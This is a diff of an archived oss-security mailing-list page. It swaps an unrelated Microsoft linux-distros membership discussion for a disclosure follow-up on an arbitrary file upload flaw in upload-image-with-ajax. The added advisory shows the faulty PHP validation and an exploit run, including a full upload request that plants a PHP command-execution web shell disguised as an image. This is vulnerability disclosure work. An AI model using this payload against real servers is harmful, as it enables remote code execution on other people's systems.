@@ -1,95 +1,82 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2019/07/06/3
-Message-ID: <20190706193737.GA23344@openwall.com>
-Date: Sat, 6 Jul 2019 21:37:37 +0200
-From: Solar Designer <solar@...nwall.com>
-To: oss-security@...ts.openwall.com
-Subject: Re: linux-distros membership application - Microsoft
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2019/12/23/2
+Message-ID: <3894D4AF-10B8-46F7-BAF5-C800F8FCFE20@me.com>
+Date: Mon, 23 Dec 2019 16:52:05 -0500
+From: "Larry W. Cashdollar" <larry0@...com>
+To: Open Security <oss-security@...ts.openwall.com>
+Subject: Re: Arbitrary file upload vulnerability in upload-image-with-ajax v1.0
 Content-Type: text/plain; charset=utf-8
 
-Hi all,
+Hello,
 
-Per our current policy and precedents, I see no valid reasons not to
-subscribe Microsoft (or part(s) of it, see below) to linux-distros.  So
-I intend to figure out some detail and proceed with the subscription.
+An update and a correction.
 
-The only voiced reasons not to, such as in Georgi Guninski's posting and
-in comments on some technology news sites that covered Microsoft's
-request, are irrelevant per our currently specified membership criteria.
+The CVE number should be CVE-2019-8293.  The software author also has fixed the vulnerability:
 
-Besides, (at least to me) Microsoft doesn't look all that different from
-many other large corporations, including some which already have their
-Linux distro teams represented on the list.  Microsoft has a lasting
-stigma from its past actions from long ago.  IMO, we shouldn't let that
-result in a biased decision against current Microsoft, effectively
-favoring other corporations who might not be any better currently, but
-just don't have that established stigma.
+https://github.com/abcprintf/upload-image-with-ajax/commit/71436ba5102010397519d4b25ea57591cfb4974c
 
-On Fri, Jun 28, 2019 at 01:08:12PM -0400, Sasha Levin wrote:
-> Can I suggest that we fork the discussion around security-bugs.rst to
-> LKML? I can suggest an initial patch to address your comments here but I
-> think that this is better handled on LKML.
+Thanks,
+Larry
 
-Yes, please.
+﻿On 12/23/19, 12:09 PM, "Larry W. Cashdollar" <larry0@...com> wrote:
 
-> Microsoft's history with Linux is a rather recent one. I can offer the
-> following examples if you're willing to give us a few months off of the
-> "1 year" requirement:
-> 
-> CVE-2018-1002105: 
-> https://azure.microsoft.com/en-us/updates/aks-clusters-patched-for-kubernetes-vulnerability/
-> CVE-2018-5391, CVE-2018-5390: 
-> https://azure.microsoft.com/en-us/blog/security-bulletin-for-august-2018/
-> CVE-2019-5736: 
-> https://azure.microsoft.com/en-us/updates/iot-edge-fix-cve-2019-5736/
-> CVE-2019-11477, CVE-2019-11478, CVE-2019-11479: 
-> https://azure.microsoft.com/en-us/updates/security-advisory-on-linux-kernel-tcp-vulnerabilities-for-hdinsight-clusters/
+    Title: Arbitrary file upload vulnerability in upload-image-with-ajax
+    Author: Larry W. Cashdollar
+    Date: 2019-12-16
+    CVE-ID:[CVE-2019-8292]
+    Download Site: https://github.com/abcprintf/upload-image-with-ajax/
+    Vendor: adcprintf
+    Vendor Notified: 2019-12-16
+    Vendor Contact: wh.cprintf@...il.com
+    Advisory: http://www.vapidlabs.com/advisory.php?v=211
+    Description: upload-image-with-ajax
+    Vulnerability:
+    The code below changes the $ready flag to true if the file conforms to the size of < 1000000. Reversing the check that the file is an image. So, a .php file can be uploaded with only a warning allowing code execution.
+    
+    $ready = false;
+    if((($imageType == "image/jpeg") || ($imageType == "image/jpg") || ($imageType == "image/png"))&&in_array($fileExt, $validext)){
+    $ready = true;
+    }else{
+    echo "was not an image
+    ";
+    /You should abort the upload right here/
+    }
+    if($_FILES["fileUpload"]["size"] < 1000000){
+    $ready = true;
+    echo "file size is ".$_FILES['fileUpload']["size"]."
+    ";
+    }else{
+    echo "file was TOO BIG!";
+    }
+    
+    Exploit Code:
+     $ ./fileupload_exploit 192.168.0.3 80 /upload-image-with-ajax/upload.php
+    POST request size is 469 bytes
+     
+    Sending Payload:
+    POST //upload-image-with-ajax/upload.php HTTP/1.1
+    Host: 192.168.0.3
+    User-Agent: File Upload Exploiter/v1.2
+    Accept: */*
+    Content-Length: 237
+    Content-Type: multipart/form-data; boundary=------------------------c8e05c8871143853
+     
+    --------------------------c8e05c8871143853
+    Content-Disposition: form-data; name="fileUpload"; filename="shell.jpg"
+    Content-Type: image/jpeg
+     
+    <?php $cmd=$_GET['cmd']; system($cmd);?>
+     
+    --------------------------c8e05c8871143853--
+     
+    HTTP/1.1 200 OK
+    Date: Mon, 16 Dec 2019 04:39:56 GMT
+    Server: Apache/2.4.25 (Debian)
+    Content-Length: 37
+    Content-Type: text/html; charset=UTF-8
+     
+    file size is 42<br>upload successful!
+    [+] Total bytes read: 185
+    
 
-The oldest of these is August 8, 2018, which is just 1 month short of
-the 1 year term.  I suppose we could either give Microsoft this 1 month
-off as you suggest based on Microsoft's track record of promptly dealing
-with security issues in non-Linux products, or subscribe Microsoft to
-linux-distros in August 2019 (or later).
 
-More importantly, maybe we shouldn't list "Microsoft" as a member of
-linux-distros.  Microsoft is so much more than the recent Linux-based
-products and services.  We similarly list "Amazon Linux AMI" rather than
-"Amazon", and "Chrome OS" rather than "Google" (and we had separately
-listed "Android", which has since unsubscribed), and "Ubuntu" rather
-than "Canonical".  OTOH, we were not as careful to list proper products,
-etc. for some others such as "Oracle".
-
-If we list "Microsoft", this might be especially confusing since issues
-being reported might also be relevant to Windows.  The reporters need to
-know they're not reaching Windows security team unless they specifically
-authorize that.
-
-Any suggestions on the above?
-
-Regardless, the list policy only allows use of the information for
-"getting the issue fixed for your distro's users and, only in rare
-extreme cases, for deployment of maximally non-revealing changes to
-maintain security of your distro's infrastructure most essential to the
-distro users' security in face of the security issue being dealt with.
-The need-to-know condition is met only if the person needs to
-participate in one of these two activities."  This is meant to preclude
-sharing within the organization beyond its parts responsible for the
-"distro" the organization is subscribed for.
-
-> On Fri, Jun 28, 2019 at 02:57:43PM +0200, Solar Designer wrote:
-> >If Microsoft joins for its Linux offerings (including Linux on top of
-> >Windows), then checking if the Linux issues also affect Windows (itself)
-> >would involve sharing beyond the need-to-know condition of
-> >(linux-)distros list policy, so isn't allowed by default.  It could
-> >still be done with explicit approval of the reporter, though, and I
-> >expect most people would give such approval if asked.
-> 
-> I'd love to develop a framework that would allow for sharing of reports
-> between linux-distros/security@.../MSRC given the explicit approval of
-> the reporter. I think that the current "silo" model is broken.
-> 
-> Microsoft in general, and MSRC in particular have proved during
-> Meltdown/Spectre that they are a trusted entity which can work well with
-> the open source community to advance our common goals. 
-
-Alexander
